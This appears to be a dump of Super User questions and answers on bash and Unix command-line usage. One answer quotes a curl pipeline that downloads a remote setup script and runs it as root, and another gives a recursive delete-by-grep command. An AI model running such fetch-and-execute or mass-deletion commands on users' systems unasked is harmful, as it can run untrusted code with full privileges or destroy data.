if [[ ${array[$test2]} ]]; then echo ""Exists""; fi    # doesn't
</code></pre>

<p>To set up the array initially you could also do direct assignments:</p>

<pre><code>array[foo]=1
array[bar]=1
# etc.
</code></pre>

<p>or this way:</p>

<pre><code>array=([foo]=1 [bar]=1 [baz]=1)
</code></pre>
"
"Using the watch command with an argument that contains quotes","276701","<bash><unix><watch>","18","<p>I guess you have to escape the <code>$</code> sign:</p>

<pre><code>watch ""ps -ef | awk -F' ' '{print \$2}'""
</code></pre>

<p>otherwise it would be interpreted by the shell which would result in an empty string (<code>""""</code>) - i.e. <code>awk</code> would print the whole line.</p>
"
"Difference between '{}' and {} in find command?","995617","<linux><command-line><bash><find><syntax>","18","<p>For the <code>bash</code> shell, <code>'{}'</code> and <code>{}</code> are interchangeable.  This is not be the case with all shells (such as <code>fish</code>).</p>

<p>Putting the argument in single quotes explicitly indicates that the curly braces should be sent to <code>find</code>.  Depending on the usage, the bash shell sometimes substitutes the contents of curly brackets.</p>

<p>As seen below, bash does not substitute empty brackets, and they get passed to the command.  For the <code>find</code> command, it doesn't matter.</p>

<pre><code>$ echo {}
{}

$ echo {1}
{1}

$ echo {1,3}
1 3

$ echo '{1,3}'
{1,3}
</code></pre>
"
"Ubuntu grep, find etc: ""Permission denied"" and ""No such file or directory"" output","382333","<linux><bash><ubuntu><find><grep>","18","<p>with grep you could specifiy the -s flag which does pretty much what @ortang said</p>

<blockquote>
  <p><strong>-s, --no-messages</strong>
                Suppress error messages about nonexistent or unreadable files.  Portability note: unlike GNU grep, 7th Edition Unix grep did
  not conform to POSIX, because it  lacked  -q  and  its  -s  option
                behaved like GNU grep's -q option.  USG-style grep also lacked -q but its -s option behaved like GNU grep.  Portable shell
  scripts should avoid both -q and -s and should redirect standard and
                error output to /dev/null instead.</p>
</blockquote>

<p>with find as far as I know @ortangs answer is the best. 
something like</p>

<p><code>find / -name ""myfile"" -type f -print 2&gt;/dev/null</code></p>
"
"How can I use two parameters at once with xargs?","375690","<command-line><bash><xargs><command-line-arguments>","18","<p>Something like this will do the trick and preserve full path, handle space, rename <code>folder/movie.mov</code> to <code>folder/movie.flv</code>, etc.</p>

<pre><code>find . -name ""*.mov"" | while read movie;do
  ffmpeg -i ""$movie"" -f flv ""${movie%.mov}.flv""
done
</code></pre>

<p>And if I misunderstood you and you want all the .flv movies in the current directory, use this one instead:</p>

<pre><code>find . -name ""*.mov"" | while read movie;do
  ffmpeg -i ""$movie"" -f flv ""$(basename ""${movie%.mov}.flv"")""
done
</code></pre>
"
"unix - split a huge .gz file by line","381394","<linux><perl><bash><shell><unix>","18","<p>How to do this best depends on what you want:</p>

<ul>
<li>Do you want to extract a single part of the large file?</li>
<li>Or do you want to create all the parts in one go?</li>
</ul>

<hr>

<p>If you want a <strong>single part of the file</strong>, your idea to use <code>gunzip</code> and <code>head</code> is right. You can use:</p>

<pre><code>gunzip -c hugefile.txt.gz | head -n 4000000
</code></pre>

<p>That would output the first 4000000 lines on standard out - you probably want to append another pipe to actually do something with the data.</p>

<p>To get the other parts, you'd use a combination of <code>head</code> and <code>tail</code>, like:</p>

<pre><code>gunzip -c hugefile.txt.gz | head -n 8000000 |tail -n 4000000
</code></pre>

<p>to get the second block.</p>

<blockquote>
  <p>Is perhaps doing a series of these a solution or would the gunzip -c
  require enough space for the entire file to be unzipped</p>
</blockquote>

<p>No, the <code>gunzip -c</code> does not require any disk space - it does everything in memory, then streams it out to stdout.</p>

<hr>

<p>If you want to create <strong>all the parts in one go</strong>, it is more efficient to create them all with a single command, because then the input file is only read once. One good solution is to use <code>split</code>; see jim mcnamara's answer for details.</p>
"
"How to reset Bash on Mac OSX, .bash_profile corrupted and bash no longer works","498312","<macos><bash><terminal><.bash-profile>","18","<p>Just putting all my comments together for an answer:</p>

<p>First thing you should do is change the shell, this way you can set a shell that will not load the bash init-scripts (<code>.bashrc</code>, <code>.bash_profile</code>) - how to do this for the Mac OS X terminal app can be seen here: <a href=""http://support.apple.com/kb/TA27005"">Apple Support</a></p>

<p>Now you should be able to open a terminal again and use your favourite command-line editor to open the <code>.bash_profile</code> file (e.g. <code>nano</code> or <code>vi</code>):</p>

<p>In this file you have to reset your <code>PATH</code> variable that is used by the terminal to find the programs it can execute.</p>

<p>This can be done with the following two lines:</p>

<pre><code>PATH=""/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:$PATH"" # Make sure to use double quotes not single quotes And on a new line 
export PATH
</code></pre>

<p>This will first set the directories that you want to have on your PATH and the export this PATH to make it available to all programs started from this shell (via export).</p>
"
"How to verify that hard drive is filled with zeroes in Linux?","559772","<hard-drive><bash><ubuntu-12.10>","18","<p><code>od</code> will replace runs of the same thing with <code>*</code>, so you can easily use it to scan for nonzero bytes:</p>

<pre><code>$ sudo od /dev/disk2 | head
0000000    000000  000000  000000  000000  000000  000000  000000  000000
*
234250000
</code></pre>

<p>You can combine this with either <code>dd</code> or <code>pv</code> to get a progress display while the scan is taking place:</p>

<pre><code>$ sudo dd if=/dev/disk2 bs=1M status=progress | od | head

# or:

$ sudo pv /dev/disk2 | od | head
</code></pre>
"
"cp overwrite vs rm then cp","1139856","<linux><bash><unix>","18","<p>In the first case, you're trying to overwrite the contents of a file that is <em>currently running</em> as a program. Linux does not allow that – if it did, you'd overwrite code right as the OS was executing it; the first difference would crash the program or make it malfunction.</p>

<p>But in the second case, you're not actually changing the old file's contents – you're creating a <em>new</em> file in its place, while the old one just loses the filename but keeps its contents untouched.</p>

<p>(Remember that <code>rm</code> doesn't <em>technically</em> delete files, it just removes directory links – similar to how <code>ln</code> adds more links to the same file. Only when a file has no links <em>and</em> no open file references, it automatically gets deleted.)</p>

<p>The system references in-use files by their inode, so it doesn't matter that they have the same filename – it's still the <em>old</em> file that remains open by the system, and even though it has no links anymore, it will only get deleted once all programs close it.</p>
"
"On Linux, how can I find all files that contain a string and delete them?","585391","<linux><command-line><bash><find>","18","<p>Here is a safe way:</p>



<pre class=""lang-none prettyprint-override""><code>grep -lrIZ foo . | xargs -0 rm -f --
</code></pre>

<ul>
<li><code>-l</code> prints file names of files matching the search pattern.</li>
<li><code>-r</code> performs a recursive search for the pattern <code>foo</code> in the given directory <code>.</code>. 
If this doesn't work, try <code>-R</code>.</li>
<li><code>-I</code> (capital <code>i</code>) causes binary files like PDFs to be skipped.</li>
<li><code>-Z</code> ensures that file names are zero- (i.e., nul-)terminated so that a name containing white space does not get interpreted in the wrong way
(i.e., as multiple names instead of one).</li>
<li><code>xargs -0</code> feeds the file names from <code>grep</code> to <code>rm -f</code>, separating words by zero (nul) bytes (remember the <code>-Z</code> option from <code>grep</code>).</li>
<li><code>--</code> is often forgotten but it is very important to mark the end of options and allow for removal of files whose names begin with <code>-</code>.</li>
</ul>

<p>If you would like to see which files are about to be deleted, simply remove the <code>| xargs -0 rm -f --</code> part, and leave off the <code>Z</code> option to <code>grep</code>.</p>

<p>Another user suggested something like the following, which <strong>you should not run</strong> because it is unsafe:</p>

<pre class=""lang-none prettyprint-override""><code>files=`grep foo * | cut -d: -f1`
rm -f $files         # unsafe, do not run it!
</code></pre>

<p>If I have files <code>ImportantStuff</code> that I do not want to delete and <code>obsolete ImportantStuff</code> containing <code>foo</code>, then I lose <code>ImportantStuff</code> (and <strong>not</strong> <code>obsolete ImportantStuff</code>!) when I run this command, because <code>$files</code> gets broken apart at spaces when it is interpreted. It is dangerous to put a list of filenames into a scalar shell variable in this way.</p>
"
"Is there a way to get iTerm + Bash usability on Microsoft Windows?","14269","<windows><command-line><bash><console><iterm>","18","<p><a href=""http://msdn.microsoft.com/powershell"" rel=""nofollow noreferrer"">Windows PowerShell</a> (<a href=""https://www.microsoft.com/download/details.aspx?id=53314"" rel=""nofollow noreferrer"">Original Server 2003 Link</a>) is probably worth a look, I'm not sure if it has all the features you want but it's certainly a step up. Otherwise, <a href=""http://sourceforge.net/projects/console/"" rel=""nofollow noreferrer"">Console</a> is something I've seen my Windows brethren using that has a fair amount of the features you've asked for.</p>
"
"Is it possible to retrieve the content of a running bash script from RAM","692947","<linux><bash><memory>","18","<p>Have a look at /proc/$PID/fd. There you should have all the file descriptors openned by the process, including the script itself. Just <code>cat $FD &gt; /tmp/yourscript.sh</code> should be enough to recover it.</p>
"
"How to execute a bash script?","82421","<linux><command-line><bash>","18","<p>You have to make the file executable. You can do that with</p>

<pre><code>chmod +x &lt;filename&gt;
</code></pre>

<p>where  is the name of your script and then you have to prepend it with <code>./</code> to instruct the shell to run a file in the local directory, like:</p>

<pre><code>./script.sh
</code></pre>

<p>You can only run files that are in your <code>PATH</code> or that you specify a path to them. <code>./</code>, the local directory, is not in the <code>PATH</code> by default because someone may use it for nefarious purposes. Imagine a script called <code>ls</code> dropped in a directory, you go inside that directory, run <code>ls</code> and that script does something bad.</p>

<p>While you are at it you may want to make it more portable by running shell instead of bash by using:</p>

<pre><code>#!/bin/sh
</code></pre>

<p>or by running bash no matter where it is installed as long as it is installed:</p>

<pre><code>#!/usr/bin/env bash
</code></pre>
"
"How to check which SysRq functions are enabled?","375816","<linux><bash><linux-kernel><bitmaps><sysrq>","17","<p>These are the available SysRq functions:</p>

<pre><code>0 - disable every SysRq function.
1 - enable every SysRq function.
2 - enable control of console logging level
4 - enable control of keyboard (SAK, unraw)
8 - enable debugging dumps of processes etc.
16 - enable sync command
32 - enable remount read-only
64 - enable signalling of processes (term, kill, oom-kill)
128 - allow reboot/poweroff
256 - allow nicing of all RT tasks
</code></pre>

<p><code>438</code> = <code>2 + 4 + 16 + 32 + 128 + 256</code>, so only the functions associated with those numbers are allowed. <a href=""https://www.kernel.org/doc/html/latest/admin-guide/sysrq.html"" rel=""noreferrer"">Read all about it in the documentation</a>.</p>

<p>If you convert <code>438</code> to base 2 (<code>110110110</code>) it is even easier to see.</p>

<pre><code>1     1     0    1    1    0   1   1   0
^256  ^128  ^64  ^32  ^16  ^8  ^4  ^2  ^1
</code></pre>

<p>Depending on your distribution, you may be able to tell if the kernel was compiled with <code>CONFIG_MAGIC_SYSRQ</code> using this command:</p>

<pre><code>$ grep SYSRQ /boot/config-$(uname -r)
</code></pre>

<p>This works for me on Ubuntu.</p>
"
"Why is Ctrl-Arrow not working in bash on OS X?","205470","<macos><bash>","17","<p>OS X uses emacs key binding my default. This is true is virtually every application on OS X, it's rather nice. It means things like C-a and C-e are beginning/end of line. You also get the nifty backward-word-kill with M-backspace, oh, and kill-line with C-k.</p>

<p>This should mean that in your terminal forward/backward-word are bound to M-f and M-b, respectively (M = Meta = alt/option), however that is not the case. On OS X forward/backword-word are bound to M-→ and M-← by default.</p>

<p>You can alter  this behavior by changing how the GNU Readline Library is configured for your account. This takes place in your <code>~/.inputrc</code> file. You can get a big list of bindable commands with <code>man readline</code> as well as in the online documentation like <a href=""http://www.faqs.org/docs/bashman/bashref_93.html#SEC100"" rel=""noreferrer"">this here.</a>.</p>

<p>So to answer your question, you want to remap what Readline does when it sees C-→ and C-← to do what it does on your linux server.</p>

<p>The syntax for a <code>~/.inputrc</code> file is pretty simple for what you want to do: <code>key-sequence: action</code>.</p>

<p>This should be what you need to get the desired behavior:</p>

<pre><code>""\e[5C"": forward-word
""\e[5D"": backward-word
</code></pre>

<p><a href=""http://linuxart.com/log/archives/2005/10/13/super-useful-inputrc/"" rel=""noreferrer"">Here's another page</a> with additional useful bindings.</p>

<p>(You could probably get away with copying /etc/inputrc from your linux box to your OS X ~/.inputrc)</p>
"
"How can I make `find` find files in reverse chronological order?","608887","<bash><unix><find>","17","<p>While Paul's solution is generally OK, it involves more I/O than simply:</p>

<pre><code>find bin/ -type f -printf '%Ts\t%p\n' | sort -nr | cut -f2
</code></pre>
"
"Running scripts from another directory","510152","<linux><command-line><bash><shell><script>","17","<p>sh /path/to/script will spawn a new shell and run she script independent of your current shell. The <code>source</code> (.) command will call all the commands in the script in the current shell. If the script happens to call <code>exit</code> for example, then you'll lose the current shell. Because of this it is usually safer to call scripts in a separate shell with sh or to execute them as binaries using either the full (starting with <code>/</code>) or relative path (<code>./</code>). If called as binaries, they will be executed with the specified interpreter (<code>#!/bin/bash</code>, for example).</p>
<p>As for knowing whether or not a script will find the files it needs, there is no good answer, other than looking at the script to see what it does. As an option, you could always go to the script's folder in a sub-process without leaving your current folder:</p>
<pre><code>(cd /wherever/ ; sh script.sh)
</code></pre>
"
"How to edit .bashrc without logging in","1276960","<bash><virtualbox><terminal><centos><grub>","17","<p><kbd>Ctrl</kbd><kbd>Alt</kbd><kbd>F1</kbd> might be getting captured by the host, or VirtualBox might not be passing it on correctly. A couple of quick tests tells me that you can use the <em>Host</em> key defined in VirtualBox instead of <kbd>Ctrl</kbd><kbd>Alt</kbd> (could be the left <kbd>Ctrl</kbd>, or the left <kbd>⌘</kbd> on Macs). So, pressing  <kbd>⌘</kbd><kbd>F1</kbd> switched to TTY1 in VirtualBox for me (and similarly for <kbd>⌘</kbd><kbd>F7</kbd> back to GUI).</p>
"
"Spawn New Cygwin Window from Within Cygwin","156309","<bash><terminal><cygwin>","17","<p><code>cygstart /bin/bash -li</code></p>
"
"Bash extended globbing inside a Makefile","619849","<bash><make>","17","<ol>
<li>You need to set <code>extglob</code>.</li>
<li>You need to tell make to use bash, not sh.</li>
</ol>
<h3>Makefile:</h3>
<pre><code>SHELL=/bin/bash
.SHELLFLAGS=&quot;-O extglob -c&quot;
 ...
</code></pre>
"
"how to copy entire linux root filesystem to new hard drive on with ssh and tar","594203","<linux><bash><ssh><tar><cat>","17","<p>Use rsync. From the new host, you can use</p>

<p><code>rsync -avP --numeric-ids --exclude='/dev' --exclude='/proc' --exclude='/sys' root@failedharddrivehost:/ /path/to/destination/</code></p>

<p>I wouldn't try involving something like tar because it probably won't work when there are broken files.</p>
"
"Wrapping long bash commands in script files","237072","<command-line><bash><word-wrap>","17","<p>Works fine here. Make sure that the backslash is the very last character on the line, and that the file uses *nix line endings.</p>
"
"How do I pipe output to date -d ""value""?","711017","<linux><bash><grep><pipe><date>","17","<pre><code>gmt=""$(grep ""something"" logfile.txt | grep ""Succeeded"" | cut -f1 -d'[')""
date -d ""$gmt""
</code></pre>

<p>Or, if you prefer the pipeline format:</p>

<pre><code>grep ""something"" logfile.txt | grep ""Succeeded"" | cut -f1 -d'[' | { read gmt ; date -d ""$gmt"" ; }
</code></pre>

<p>The problem is that <code>date</code> does not use stdin.  Thus, we have to capture the stdin into a variable (called <code>gmt</code> here) and then supply that on the command line to <code>date</code>.</p>

<p>Sample output from the second approach:</p>

<pre><code>$ echo  ""2014-01-30 05:04:27 GMT"" | { read gmt ; date -d ""$gmt"" ; }
Wed Jan 29 21:04:27 PST 2014
</code></pre>
"
"Is it possible to run networking commands like nmap in WSL?","1110625","<networking><windows-10><bash><windows-10-v1607><windows-subsystem-for-linux>","17","<p>No, according to this thread: <a href=""https://github.com/Microsoft/BashOnWindows/issues/69"" rel=""noreferrer"">https://github.com/Microsoft/BashOnWindows/issues/69</a> the network options to support nmap are currently not all implemented.</p>
"
"How do I override the bash ""noclobber"" option?","354439","<bash>","17","<p>Yes.  Append <code>|</code> to the redirection operator to form <code>&gt;|</code>.  This is in <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Redirections"" rel=""noreferrer"">&sect; 3.6.2 of the Bash Reference Manual</a>, q.v.</p>

<blockquote>
  <p>If the redirection operator is ‘>’, and the noclobber option to the set builtin has been enabled, the redirection will fail if the file whose name results from the expansion of word exists and is a regular file. If the redirection operator is ‘>|’, or the redirection operator is ‘>’ and the noclobber option is not enabled, the redirection is attempted even if the file named by word exists.</p>
</blockquote>

<p>Visit <a href=""http://www.cyberciti.biz/tips/howto-keep-file-safe-from-overwriting.html"" rel=""noreferrer"">this tutorial about the noclobber option</a>. It might be of help.</p>
"
"How to run sed on over 10 million files in a directory?","257250","<bash><find><xargs>","17","<p>Give this a try:</p>

<pre><code>find -name '*.txt' -print0 | xargs -0 -I {} -P 0 sed -i -e 's/blah/blee/g' {}
</code></pre>

<p>It will only feed one filename to each invocation of <code>sed</code>. That will solve the ""too many args for sed"" problem. The <code>-P</code> option should allow multiple processes to be forked at the same time. If 0 doesn't work (it's supposed to run as many as possible), try other numbers (10? 100? the number of cores you have?) to limit the number.</p>
"
"Understanding how inputs are sent to pipes in Bash","178796","<linux><bash>","17","<p>""Input"" and ""command line arguments"" are different things.</p>

<p><code>rm</code> removes the files provided as arguments.</p>

<p>A pipe redirects the output of the left-hand command to the input of the right-hand command.  It does not affect the command line arguments of the program on the right.</p>

<p>To do what you're trying to do, try using <code>xargs</code> to convert standard input to command-line arguments for executing a program.  That's its job.</p>

<p><code>which gem | xargs rm</code>, for example, will remove the <code>gem</code> in your PATH.</p>
"
"Multiple Installations and Understanding $PATH","1104906","<linux><bash><path>","17","<p>Bash caches the full path to executables so that it doesn't have to look through <code>$PATH</code> every time.</p>

<p>You can see what is in the cache using the <code>hash</code> command:</p>

<pre><code>deltik@node51 [~]$ hash
hits    command
   1    /usr/bin/git
</code></pre>

<p>This cache can be cleared with <code>hash -r</code>:</p>

<pre><code>deltik@node51 [~]$ hash -r
deltik@node51 [~]$ hash
hash: hash table empty
</code></pre>

<hr>

<h2>Additional Resources</h2>

<ul>
<li><a href=""https://unix.stackexchange.com/a/5610"">How do I clear Bash's cache of paths to executables?</a> on Unix Stack Exchange</li>
<li><a href=""https://unix.stackexchange.com/a/86017"">What is the purpose of the hash command?</a> on Unix Stack Exchange</li>
<li><a href=""https://superuser.com/a/734139/83694"">How to get bash to automatically refresh program locations' cache?</a> on Super User</li>
<li><a href=""http://wayback.archive.org/web/20160507040559/http://ss64.com/bash/hash.html"" rel=""nofollow noreferrer"">Documentation on <code>hash</code></a></li>
</ul>
"
"How to check if cygwin mintty/bash is run as administrator?","660191","<windows><bash><terminal><cygwin>","17","<p>I just wrote this function for the same reason.  I never know which shell has admin privileges.</p>

<pre><code>function isadmin()
{
    net session &gt; /dev/null 2&gt;&amp;1
    if [ $? -eq 0 ]; then echo ""admin""
    else echo ""user""; fi
}
</code></pre>

<p>It adapted from this answer <a href=""https://stackoverflow.com/a/11995662/307968"">https://stackoverflow.com/a/11995662/307968</a> for windows cmd shell.   Net Session returns 0 status if you are admin.</p>

<p>Now I just need to change my prompt, or maybe the titlebar color....</p>
"
"Bash: lookup an IP for a host name, including /etc/hosts in search","305939","<linux><ubuntu><bash><dns><hosts-file>","17","<p><code>getent</code> uses the low-level glibc information functions to query all configured sources.</p>

<pre><code>$ getent ahosts amd.com
163.181.249.32  STREAM amd.com
163.181.249.32  DGRAM  
163.181.249.32  RAW    
$ getent ahosts ipv6.google.com
2001:4860:b009::69 STREAM ipv6.l.google.com
2001:4860:b009::69 DGRAM  
2001:4860:b009::69 RAW    
</code></pre>
"
"Edit first line of large text file","519369","<linux><bash><grep><sed><textfiles>","17","<p>You can use <code>less</code> to see what you want to edit and use <code>sed</code> to make the changes. This way you edit without loading the entire file.</p>

<p>Another way is to split the file, edit and join again:</p>

<pre><code>split -b 10000k &lt;file&gt;

and to join:

cat xa* &gt; &lt;file&gt;
</code></pre>
"
"Ctrl+c in a sub process is killing a nohup'ed process earlier in the script","708919","<linux><bash><less><nohup>","17","<p>I was right in thinking that it was <code>SIGINT</code> being sent to all processes when <kbd>ctrl</kbd>+<kbd>c</kbd>, but I was silly in thinking that making another process would bring it outside the <code>process group</code> (see my attempts in the <code>P.P.S.</code>).</p>

<p><a href=""https://superuser.com/questions/422428/less-interrupting-in-less"">This</a> is, not only the exact use case, but the correct solution.</p>

<p>Because of how my script was structured the answer there didn't fit verbatim, this is the script now;</p>

<pre><code>#/bin/bash

setsid {SERVERCOMMAND} &gt; currentOutput.log 2&gt;&amp;1 &amp;
less +F currentOutput.log
</code></pre>

<p>The server continues to output to the log file after I <kbd>ctrl</kbd>+<kbd>c</kbd> in <code>less</code>.</p>

<p>Thanks for everyone's time.</p>
"
"`alias rm=""rm -i""` considered harmful?","384769","<bash><rm>","17","<p>You're right.</p>

<p>It's bad because you get used to it. If you're on a system that doesn't have it, and you <code>rm</code>, it immediately starts deleting and you're wondering what's going on.</p>

<p>Many users are used to SSH'ing into different systems; so using lots of different systems, sometimes without personalized user accounts (including aliases) set up, is rather common.</p>

<p>Instead, use e.g. <code>alias rmi='rm -i'</code> and learn to use that one. If that isn't set up on a different system, you didn't accidentally delete files and can always fall back to typing the full command.</p>
"
"Replace existing folder with mv command","623392","<macos><mac><bash><mv>","17","<p>If <code>~/oldstuff</code> does not exist, </p>

<pre><code>mv ~/newstuff ~/oldstuff
</code></pre>

<p>will rename <code>newstuff</code> to <code>oldstuff</code>. If it exists, it will move <code>newstuff</code> into <code>oldstuff</code>.</p>

<p>So, to answer your question, first remove <code>~/oldstuff</code> (or rename it to <code>olderstuff</code>, see this question again on how to do it), then use the <code>mv</code> command as you did.</p>
"
"Manually select/unselect lines before forwarding to stdout","1459886","<linux><command-line><bash><zsh><grep>","17","<p>While I like the <code>vipe</code> approach, I've found an even cooler way: <a href=""https://github.com/junegunn/fzf"" rel=""noreferrer"">fzf</a>.</p>

<pre><code>cat people.txt | grep -v ""^#"" | grep ""^.*Fruit.*Folk"" | fzf -m | cat
</code></pre>

<p>...gives a nice list where I can search in and toggle the items with the keyboard and disappears completely when I am done.</p>
"
"Using Ctrl or Alt AND backspace to delete last word in Bash","296572","<bash><linux-terminal>","17","<p>You can always use <kbd>Ctrl</kbd>-<kbd>W</kbd>. It deletes the word before the cursor and works in every Bash.</p>

<p>See here for a list of <a href=""http://en.wikipedia.org/wiki/Bash_%28Unix_shell%29#Keyboard_shortcuts"" rel=""noreferrer"">Bash keyboard shortcuts</a>.</p>
"
"find files with ACLs set","398448","<linux><bash><find><acl>","16","<p><code>getfacl</code> can dump ACLs recursively, and it has a <code>--skip-base</code> option for ignoring files without ACLs.</p>

<pre><code>getfacl -R -s -p /directory | sed -n 's/^# file: //p'
</code></pre>
"
"PHP script can't run bash script. sh: Permission denied","455935","<bash><permissions><script><php>","16","<p>Try the following suggestions:</p>

<ul>
<li>Try to run below test command, and check whether it worked:

<ul>
<li><code>php -r ""echo exec('whoami');""</code></li>
</ul></li>
<li>Make sure that all parent directories and the files have at least <code>r-x</code> flag permissions:

<ul>
<li><code>chmod 755 dir; chmod 755 file</code></li>
</ul></li>
<li>Make sure that the owner of the file is your <a href=""https://unix.stackexchange.com/q/155549/21471"">Apache user</a>.

<ul>
<li>Try also to add a <code>+s</code> flag (sudo) to the file (not recommended):

<ul>
<li><code>chmod u+s file</code>,</li>
</ul></li>
</ul></li>
<li>Make sure that your PHP is not running in a <a href=""http://php.net/manual/en/features.safe-mode.php"" rel=""nofollow noreferrer""><code>safe_mode</code></a>.</li>
<li>Make sure that the script is inside your Apache root:

<ul>
<li>Otherwise, move the script inside it,</li>
<li>or add that directory to your Apache configuration,</li>
<li>or add this directory to your <code>include_path</code>, e.g.:

<ul>
<li><code>php.ini</code> file: <code>include_path "".:/usr/local/lib/php:/your/dir""</code></li>
<li>or <a href=""http://php.net/manual/en/configuration.changes.php"" rel=""nofollow noreferrer""><code>.htaccess</code></a> file: <code>php_value include_path "".:/usr/local/lib/php:/your/dir""</code></li>
</ul></li>
</ul></li>
<li>Check whether your shell is set to valid (e.g. <code>/bin/sh</code>) to your Apache user (e.g. check with: <code>finger</code>).</li>
<li>Make sure  that your <code>php.ini</code> doesn't use: <code>disable_functions</code> for <code>exec</code> function</li>
<li>If using SELinux or having <code>selinux-utils</code> installed (a Security-enhanced Linux system), check <code>getenforce</code>/<code>setenforce</code> configuration as described in <a href=""https://superuser.com/a/455990/87805"">@Tonin</a> answer.</li>
</ul>

<h3>Troubleshooting:</h3>

<ul>
<li>If you changed your <code>php.ini</code> or <code>httpd.conf</code> file, don't forget to restart the web server,</li>
<li>Check your Apache error log for additional details.</li>
<li>Enable in your <code>php.ini</code> all kind of errors (<code>display_error</code>, <code>error_reporting</code>, etc.).</li>
</ul>
"
"How to test if a variable is equal to a number in shell","688882","<linux><bash><shell><shell-script>","16","<p>Your script indicates you are using string comparisons.</p>

<p>Assume server name could be a string instead of number only.</p>

<p>For <strong>String comparisons</strong>:<br>
<code>if [[ ""$Server_Name"" == 1 ]]; then</code></p>

<p><strong>Notes:</strong></p>

<ul>
<li>Spacing around == is a <strong>must</strong>  </li>
<li><p>Spacing around = is a <strong>must</strong><br>
<code>if [ $Server_Name=1 ]; then</code> is WRONG</p></li>
<li><p>[[ ... ]] reduces errors as no pathname expansion or word splitting takes place between [[ and ]]</p></li>
<li><p>Prefer quoting strings that are ""words""</p></li>
</ul>

<p>For <strong>Integer comparisons</strong>:<br>
<code>if [[ ""$Server_Name"" -eq 1 ]]; then</code></p>

<hr>

<p>More information:</p>

<ul>
<li><a href=""http://tldp.org/LDP/abs/html/comparison-ops.html"" rel=""noreferrer"">Bash Comparison Operators</a></li>
<li><a href=""https://stackoverflow.com/questions/2600281/what-is-the-difference-between-operator-and-in-bash"">SO: What is the difference between operator “=” and “==” in Bash?</a></li>
<li><a href=""https://unix.stackexchange.com/questions/16109/bash-double-equals-vs-eq"">Unix &amp; Linux SE: Bash: double equals vs -eq</a></li>
</ul>
"
"How do I clear what I typed into the prompt?","324601","<bash><terminal>","16","<p><code>Control + A</code> then <code>Control + K</code>. The first moves your cursor to the beginning of the line, the second clears the line after the cursor.</p>

<p>A messier way to do this is hit enter and then hit <code>Control + C</code>. Credit to @billc.cn</p>

<p>If you want to clear the whole prompt, use <code>Control + L</code>.</p>
"
"Dash (-) in front of bash","278859","<macos><bash>","16","<p>It means that <code>bash</code> is invoked as a login shell.</p>
<hr />
<p><code>man bash</code> says:</p>
<blockquote>
<p>A login shell is one whose first character of argument zero is a <code>-</code>, or one started with the <code>--login</code> option.</p>
<p>When bash is invoked as an interactive login shell, or as a non-interactive shell with the <code>--login</code> option, it first reads and executes commands from the file <code>/etc/profile</code>, if that file exists.  After reading  that  file,  it  looks for <code>~/.bash_profile</code>, <code>~/.bash_login</code>, and <code>~/.profile</code>, in that order, and reads and executes commands from the first one that exists and is readable.  The <code>--noprofile</code> option may be used when the shell is started to inhibit this behavior.</p>
<p>When a login shell exits, bash reads and executes commands from the file <code>~/.bash_logout</code>, if it exists.</p>
</blockquote>
<hr />
<p>You'll find <code>login -pf</code> in your <code>ps</code> output, which starts a login shell by default.</p>
<p>Try running <code>login -pf</code> and <code>login -pfl</code> and see the difference. <code>man login</code> describes the difference:</p>
<blockquote>
<p><code>-l</code> Tells the program executed by login that this is not a login session (by convention, a login session is signalled to the program with a hyphen as the first character of <code>argv[0]</code>; this option disables that), and prevents it from <code>chdir(2)</code>ing to the user's home directory.  The default is to add the hyphen (this is a login session).</p>
</blockquote>
"
"Howto switch / chage user id witin a bash script to execute commands in the same script?","468161","<bash><sudo><bash-scripting>","16","<p>No. But you can use <code>sudo</code> to run a shell and use a heredoc to feed it commands.</p>

<pre><code>#!/bin/bash
whoami
sudo -u someuser bash &lt;&lt; EOF
echo ""In""
whoami
EOF
echo ""Out""
whoami
</code></pre>
"
"apt-get install is not working in WSL","1359633","<ubuntu><bash><windows-subsystem-for-linux><apt><ubuntu-18.04>","16","<p>Executed below 2 commands and then I was able to install the packages. </p>

<p>sudo apt update</p>

<p>sudo apt install python3-pip</p>

<p>Source -  <a href=""https://linuxize.com/post/how-to-install-pip-on-ubuntu-18.04/"" rel=""noreferrer"">https://linuxize.com/post/how-to-install-pip-on-ubuntu-18.04/</a></p>
"
"Clear terminal output of last command only","649884","<linux><ubuntu><bash><terminal>","16","<p>With thanks to @rici, this behaviour can be called ""folding"".  The output of commands isn't forgotten, but you can hide it until you need it again.  Folding is common in text editors but seems to be rare in terminal emulators.</p>

<p><a href=""http://finalterm.org/"" rel=""noreferrer"">Final Term</a> is a new terminal emulator that includes folding among many other fancy tricks.  Beware: ""Final Term is in heavy development and neither stable nor feature complete!""  It was heavily-enough developed to fold my commands when I tested it, but too unstable not to crash.  One to watch.</p>
"
"What does the last ""-"" (hyphen) mean in options of `bash`?","1388584","<linux><command-line><bash><pipe>","16","<p>Bash behaves in somewhat non-standard way when it comes to <code>-</code>.</p>

<p><a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html#tag_12_02"" rel=""noreferrer"">POSIX</a> says:</p>

<blockquote>
  <p>Guideline 10:<br>
  The first <code>--</code> argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the <code>-</code> character.</p>
  
  <p>[…]</p>
  
  <p>Guideline 13:<br>
  For utilities that use operands to represent files to be opened for either reading or writing, the <code>-</code> operand should be used to mean only standard input (or standard output when it is clear from context that an output file is being specified) or a file named <code>-</code>.</p>
</blockquote>

<p>And</p>

<blockquote>
  <p>Where a utility described in the Shell and Utilities volume of POSIX.1-2017 as conforming to these guidelines is required to accept, or not to accept, the operand <code>-</code> to mean standard input or output, this usage is explained in the OPERANDS section. Otherwise, if such a utility uses operands to represent files, it is implementation-defined whether the operand <code>-</code> stands for standard input (or standard output), or for a file named <code>-</code>.</p>
</blockquote>

<p>But then <a href=""https://linux.die.net/man/1/bash"" rel=""noreferrer""><code>man 1 bash</code></a> reads:</p>

<blockquote>
  <p>A <code>--</code> signals the end of options and disables further option processing. Any arguments after the <code>--</code> are treated as filenames and arguments. An argument of <code>-</code> is equivalent to <code>--</code>.</p>
</blockquote>

<p>So for Bash <code>-</code> means neither standard input nor a file, hence somewhat non-standard.</p>

<p>Now your particular case:</p>

<blockquote>
<pre><code>curl -sL https://rpm.nodesource.com/setup_6.x | sudo -E bash -
</code></pre>
</blockquote>

<p>I <em>suspect</em> the author of this command may not realize <code>-</code> is equivalent to <code>--</code> in this case. I <em>suspect</em> the author wanted to make sure <code>bash</code> will read from its standard input, they expected <code>-</code> to work according to the guideline 13.</p>

